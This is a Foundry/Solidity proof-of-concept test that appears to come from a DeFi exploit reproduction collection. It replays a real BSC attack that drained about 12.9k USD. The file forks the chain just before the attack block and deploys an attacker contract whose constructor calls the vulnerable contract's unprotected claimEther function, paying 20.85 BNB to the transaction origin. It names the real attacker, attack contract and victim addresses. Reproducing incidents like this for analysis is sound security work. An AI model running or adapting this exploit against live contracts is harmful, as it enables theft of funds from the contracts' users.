pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 12.9k USD
// Attacker : https://bscscan.com/address/0xe60329a82c5add1898ba273fc53835ac7e6fd5ca
// Attack Contract : https://bscscan.com/address/0x54588267066ddbc6f8dcd724d88c25e2838b6374
// Vulnerable Contract : https://bscscan.com/address/0xedd632eaf3b57e100ae9142e8ed1641e5fd6b2c0
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x679028cb0a5af35f57cbea120ec668a5caf72d74fcc6972adc7c75ef6c9a9092

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xedd632eaf3b57e100ae9142e8ed1641e5fd6b2c0

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1855263208124416377
// Twitter Guy : https://x.com/TenArmorAlert/status/1855263208124416377
// Hacking God : N/A

address constant addr1 = 0xedD632eAf3b57e100aE9142e8eD1641e5Fd6b2c0;
address constant addr2 = 0x54588267066dDBC6f8Dcd724D88C25e2838B6374;
address constant attacker = 0xE60329A82C5aDD1898bA273FC53835Ac7e6fD5cA;

interface IAddr1 {
    function claimEther(address receiver, uint256 amount) external;
}

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 43860720-1);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0x54588267066dDBC6f8Dcd724D88C25e2838B6374
contract AttackerC {
    constructor() { IAddr1(addr1).claimEther(tx.origin, 2085 * 10**16); } 
}